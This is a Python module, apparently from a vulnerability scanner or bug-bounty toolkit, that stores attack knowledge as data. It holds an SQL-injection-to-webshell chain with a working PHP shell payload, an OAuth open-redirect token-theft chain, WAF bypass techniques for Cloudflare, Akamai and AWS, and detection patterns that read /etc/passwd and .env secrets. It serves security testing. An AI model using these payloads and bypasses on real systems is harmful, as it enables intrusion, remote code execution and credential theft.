                    {"step": 3, "action": "Open redirect sends code/token to attacker's server"},
                    {"step": 4, "action": "Exchange code for access token → full account access"},
                ],
                "trigger_vulns": ["open_redirect"],
                "impact": "high",
                "notes": "Open redirect alone is low/medium. With OAuth = critical.",
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "vuln_type": "chain",
            "pattern_data": {
                "key": "chain_sqli_rce",
                "label": "SQLi → File Write → RCE",
                "steps": [
                    {"step": 1, "action": "Confirm SQL injection"},
                    {"step": 2, "action": "MySQL: SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'"},
                    {"step": 3, "action": "PostgreSQL: COPY (SELECT '...') TO '/var/www/html/shell.php'"},
                    {"step": 4, "action": "Access webshell at /shell.php?c=id"},
                ],
                "trigger_vulns": ["sqli"],
                "impact": "critical",
                "notes": "Only works if DB user has FILE privilege and web root is writable.",
            },
            "confidence": 0.8,
        },
    ]
    return chains


def _waf_bypass_techniques() -> list[dict]:
    """WAF-specific bypass techniques."""
    bypasses = [
        {
            "pattern_type": "waf_bypass",
            "technology": "cloudflare",
            "pattern_data": {
                "key": "cf_techniques",
                "waf": "Cloudflare",
                "techniques": [
                    {"type": "xss", "method": "Template literals: alert`1` instead of alert(1)"},
                    {"type": "xss", "method": "SVG events: <svg/onload=...>"},
                    {"type": "xss", "method": "Attribute events: <details/open/ontoggle=...>"},
                    {"type": "xss", "method": "String concatenation: window['al'+'ert'](1)"},
                    {"type": "sqli", "method": "MySQL comments: /*!50000SELECT*/"},
                    {"type": "sqli", "method": "Inline comments: 1'/**/OR/**/1=1"},
                    {"type": "sqli", "method": "Case variation: SeLeCt, uNiOn"},
                    {"type": "ssrf", "method": "Use decimal/octal IP: 2130706433 instead of 127.0.0.1"},
                    {"type": "general", "method": "Origin IP bypass: find real IP via DNS history, cert search"},
                ],
                "detection_headers": ["cf-ray", "server: cloudflare"],
                "success_rate": 0.6,
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "waf_bypass",
            "technology": "akamai",
            "pattern_data": {
                "key": "akamai_techniques",
                "waf": "Akamai",
                "techniques": [
                    {"type": "xss", "method": "Unicode escapes: \\u0061lert(1)"},
                    {"type": "xss", "method": "HTML entity encoding: &#97;lert(1)"},
                    {"type": "sqli", "method": "HTTP Parameter Pollution: ?id=1&id=' OR 1=1-- -"},
                    {"type": "sqli", "method": "Chunked transfer encoding bypass"},
                    {"type": "general", "method": "JSON content-type with SQL in values"},
                ],
                "detection_headers": ["x-akamai-transformed", "akamai-grn"],
                "success_rate": 0.5,
            },
            "confidence": 0.85,
        },
        {
            "pattern_type": "waf_bypass",
            "technology": "aws_waf",
            "pattern_data": {
                "key": "aws_waf_techniques",
                "waf": "AWS WAF",
                "techniques": [
                    {"type": "sqli", "method": "JSON body with SQL in deep nested keys"},
                    {"type": "xss", "method": "URL encoding: %3Cscript%3E"},
                    {"type": "general", "method": "Large request body (exceed WAF inspection limit ~8KB)"},
                    {"type": "general", "method": "Multipart form data bypass"},
                    {"type": "general", "method": "HTTP method override (X-HTTP-Method-Override)"},
                ],
                "detection_headers": ["x-amzn-requestid"],
                "success_rate": 0.5,
            },
            "confidence": 0.85,
        },
    ]
    return bypasses


def _bug_bounty_wisdom() -> list[dict]:
    """Bug bounty strategic knowledge — where to look, what pays."""
    wisdom = [
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "pattern_data": {
                "key": "bb_high_value_targets",
                "label": "High-Value Bug Bounty Targets",
                "findings_by_payout": [
                    {"vuln": "SSRF with cloud metadata access", "avg_payout": "$5,000-$25,000", "severity": "critical"},
                    {"vuln": "Account takeover (IDOR + PII)", "avg_payout": "$3,000-$15,000", "severity": "critical"},
                    {"vuln": "SQL injection (data exfiltration)", "avg_payout": "$3,000-$10,000", "severity": "critical"},
                    {"vuln": "RCE via deserialization/SSTI", "avg_payout": "$5,000-$30,000", "severity": "critical"},
                    {"vuln": "Authentication bypass", "avg_payout": "$2,000-$10,000", "severity": "high"},
                    {"vuln": "Stored XSS on main domain", "avg_payout": "$1,000-$5,000", "severity": "high"},
                    {"vuln": "IDOR on user data endpoints", "avg_payout": "$1,000-$5,000", "severity": "high"},
                    {"vuln": "Subdomain takeover", "avg_payout": "$500-$2,000", "severity": "medium"},
                    {"vuln": "Open redirect (with OAuth chain)", "avg_payout": "$500-$3,000", "severity": "medium-high"},
                    {"vuln": "CSRF on critical actions", "avg_payout": "$300-$1,500", "severity": "medium"},
                ],
            },
            "confidence": 0.85,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "pattern_data": {
                "key": "bb_where_to_look",
                "label": "Where to Look First (Bug Bounty Priority)",
                "priorities": [
                    {"area": "Authentication", "why": "Login, registration, password reset, OAuth flows — highest impact"},
                    {"area": "File uploads", "why": "Image, avatar, document uploads — often leads to XSS/RCE"},
                    {"area": "API endpoints", "why": "REST/GraphQL APIs — often less protected than web UI"},
                    {"area": "Payment/billing", "why": "Price manipulation, coupon abuse, race conditions"},
                    {"area": "User profiles", "why": "IDOR, stored XSS, data exposure"},
                    {"area": "Search functionality", "why": "XSS, SQLi, info disclosure"},
                    {"area": "Export/import features", "why": "SSRF, XXE, command injection"},
                    {"area": "Webhook/callback URLs", "why": "SSRF, open redirect"},
                    {"area": "Admin panels", "why": "Auth bypass, privilege escalation"},
                    {"area": "Mobile API", "why": "Often same backend but less validation"},
                ],
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "pattern_data": {
                "key": "bb_report_quality",
                "label": "What Makes a Bug Bounty Report Get Paid",
                "tips": [
                    "Clear, concise title describing the impact (not just 'XSS found')",
                    "Step-by-step reproduction (anyone can follow)",
                    "Working PoC (cURL command or HTTP request)",
                    "Impact analysis: what can attacker do? PII? Account takeover?",
                    "Screenshots or video proof",
                    "Suggested fix (shows expertise, builds trust)",
                    "Don't report: missing headers, clickjacking on non-sensitive pages, SPF/DMARC",
                    "Don't report: self-XSS, logout CSRF, rate limiting (unless critical)",
                ],
            },
            "confidence": 0.95,
        },
    ]
    return wisdom


def _detection_signatures() -> list[dict]:
    """Vulnerability detection signatures — response patterns that indicate vulns."""
    signatures = [
        {
            "pattern_type": "detection_indicator",
            "vuln_type": "sqli",
            "pattern_data": {
                "key": "sqli_error_signatures",
                "label": "SQL Error Signatures",
                "patterns": [
                    {"regex": "SQL syntax.*MySQL", "db": "mysql", "confidence": 0.95},
                    {"regex": "Warning.*mysql_", "db": "mysql", "confidence": 0.9},
                    {"regex": "PostgreSQL.*ERROR", "db": "postgres", "confidence": 0.95},
                    {"regex": "ORA-\\d{5}", "db": "oracle", "confidence": 0.95},
                    {"regex": "Microsoft.*ODBC.*SQL Server", "db": "mssql", "confidence": 0.95},
                    {"regex": "SQLite.*error", "db": "sqlite", "confidence": 0.9},
                    {"regex": "Unclosed quotation mark", "db": "mssql", "confidence": 0.9},
                    {"regex": "unterminated quoted string", "db": "postgres", "confidence": 0.9},
                ],
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "detection_indicator",
            "vuln_type": "ssti",
            "pattern_data": {
                "key": "ssti_detection",
                "label": "SSTI Detection Patterns",
                "patterns": [
                    {"input": "{{7*7}}", "expected": "49", "engine": "jinja2/twig"},
                    {"input": "${7*7}", "expected": "49", "engine": "freemarker/velocity"},
                    {"input": "#{7*7}", "expected": "49", "engine": "pug/thymeleaf"},
                    {"input": "<%= 7*7 %>", "expected": "49", "engine": "erb"},
                    {"input": "{{7*'7'}}", "expected": "7777777", "engine": "jinja2 (string multiplication)"},
                    {"input": "${7*'7'}", "expected": "49 or error", "engine": "java EL (number)"},
                ],
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "detection_indicator",
            "vuln_type": "lfi",
            "pattern_data": {
                "key": "lfi_success_signatures",
                "label": "LFI Success Indicators",
                "patterns": [
                    {"regex": "root:.*:0:0:", "file": "/etc/passwd", "confidence": 0.99},
                    {"regex": "\\[boot loader\\]", "file": "boot.ini", "confidence": 0.95},
                    {"regex": "\\[extensions\\]", "file": "win.ini", "confidence": 0.9},
                    {"regex": "DocumentRoot", "file": "apache config", "confidence": 0.85},
                    {"regex": "DB_PASSWORD|DB_HOST|APP_KEY", "file": ".env", "confidence": 0.95},
                ],
            },
            "confidence": 0.95,
        },
    ]
    return signatures
